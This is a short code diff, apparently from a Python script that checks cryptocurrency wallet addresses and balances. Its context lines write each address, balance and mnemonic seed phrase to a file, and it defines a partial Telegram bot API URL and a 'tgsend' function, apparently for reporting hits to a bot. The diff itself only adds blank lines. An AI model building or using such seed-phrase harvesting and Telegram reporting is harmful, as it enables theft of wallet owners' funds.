@@ -43,6 +43,7 @@ def getInternet():
     except requests.ConnectionError:
         return False
 
+
 two = "https://api.telegram.org/bot1895834648:"
 lock = threading.Lock()
 
@@ -128,6 +129,7 @@ def check():
                     w.write(
                         f'Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')
                     Settings.dry_count += 1
+
 
 
 def tgsend(adds):
